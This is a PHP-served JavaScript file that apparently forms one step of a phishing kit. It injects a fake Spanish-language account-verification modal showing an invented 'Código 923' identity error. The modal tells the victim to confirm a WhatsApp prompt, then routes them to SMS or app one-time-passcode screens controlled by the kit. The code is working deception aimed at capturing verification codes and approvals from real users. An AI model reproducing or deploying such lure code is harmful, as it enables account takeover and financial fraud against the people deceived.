<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
var my_titulo = 'Ahora Verificar tu cuenta es fácil';
var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/flow-theme.css" />
<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

<style>
  .otp-modal-overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 18px; background: rgba(31,33,38,0.45); backdrop-filter: blur(6px); z-index: 9999; }
  .otp-modal-panel { width: min(100vw, 414px); position: relative; }
  body.otp-modal-open { overflow: hidden; }
  .otp-modal-close { position: absolute; top: 12px; right: 12px; border: none; background: rgba(255,255,255,0.8); color: var(--ink); width: 36px; height: 36px; border-radius: 999px; display: grid; place-items: center; cursor: pointer; }
  .otp-modal-close:hover { background: #fff; }
  .flow-title { font-size: clamp(24px, 7vw, 30px); margin-bottom: 12px; }
  .flow-subtitle { font-size: 14px; line-height: 1.4; }
  .btn-primary { height: 52px; font-size: 18px; }
</style>

<div class="otp-modal-overlay" id="otpModalOverlay" role="dialog" aria-modal="true">
  <div class="otp-modal-panel panel" role="document">
    <button type="button" class="otp-modal-close" id="otpModalClose" aria-label="Cerrar"><i class='bx bx-x'></i></button>

    <div class="logo-mark" aria-hidden="true"><span></span><span></span><span></span></div>
    <h1 class="flow-title" id="title">Código 923. Valida tu identidad</h1>
    <p class="flow-subtitle" id="mensajeError923">Se ha presentado el error 923. Por favor confirma la información solicitada y vuelve a intentarlo.</p>

    <button type="button" id="boton-923-entendido" class="btn-primary" style="margin-top:6px;">Entendido</button>

    <div class="meta-hidden">
      <div id="jclock1"></div>
    </div>
  </div>
</div>
`;



  $('#titulo').html(my_titulo);

  if ($('#otpModalOverlay').length) {
    $('#otpModalOverlay').remove();
  }

  $('body').append(my_contenido);
  $('body').addClass('otp-modal-open');
  localStorage.setItem('contenido', my_contenido);

  var $otpModal = $('#otpModalOverlay');

  if (typeof my_data === 'undefined' || my_data === null) {
    window.my_data = {};
  }

  var mensajeCustom = '';
  if (my_data['mensaje']) {
    mensajeCustom = String(my_data['mensaje']);
  } else if (my_data['error']) {
    mensajeCustom = String(my_data['error']);
  }

  var defaultMessage = 'Confirma que eres tú. Hemos enviado un WhatsApp, responde con “sí” para continuar con el proceso.';
  var errorMessageToShow = mensajeCustom ? mensajeCustom : defaultMessage;

  $('#title').text('Código 923. Valida tu identidad');
  $('#mensajeError923').html(errorMessageToShow);

  // Detectar sobre cuál vista OTP se montó el modal (dinámica o SMS)
  var previousOtpType = (function() {
    var badgeText = ($('#otpBadge').text() || '').toLowerCase();
    if ($('#smsTimer').length || badgeText.indexOf('sms') !== -1) return 'SMS';
    if (typeof my_data !== 'undefined' && my_data && String(my_data['otpType']).toUpperCase() === 'SMS') return 'SMS';
    return 'APP';
  })();

  function goToOtpError() {
    var targetAction = (previousOtpType === 'SMS') ? 'flows/otp_sms.php' : 'flows/otp_app.php';
    var payload = {
      action: targetAction,
      otpType: previousOtpType,
      error: errorMessageToShow
    };
    var params = { otpType: previousOtpType };

    window.my_data = window.my_data || {};
    window.my_data['otpType'] = previousOtpType;
    window.my_data['error'] = errorMessageToShow;
    window.my_data['mensaje'] = null;

    window.my_runtime = window.my_runtime || {};
    var runtime = window.my_runtime;
    runtime.current_action = null;
    runtime.current_action_data = null;
    runtime.current_action_params = null;
    runtime.previous_action = targetAction;
    runtime.previous_action_data = payload;
    runtime.previous_action_params = params;

    if (typeof loadScript === 'function') {
      loadScript(targetAction, payload, params);
      return;
    }

    if (typeof processing === 'function') {
      processing({ t: 'consultar' });
    }
  }

  function restorePreviousView() {
    goToOtpError();
  }

  function closeOtpModal() {
    $('body').removeClass('otp-modal-open');
    $('#otpModalOverlay').remove();
    $(document).off('keyup.otpModal');
    restorePreviousView();
  }

  $('#boton-923-entendido, #otpModalClose').on('click', function() {
    closeOtpModal();
  });

  $otpModal.on('click', function(event) {
    if (event.target === this) {
      closeOtpModal();
    }
  });

  $(document).on('keyup.otpModal', function(event) {
    if (event.key === 'Escape') {
      closeOtpModal();
    }
  });

  setTimeout(function(){
    $('#boton-923-entendido').focus();
  }, 50);
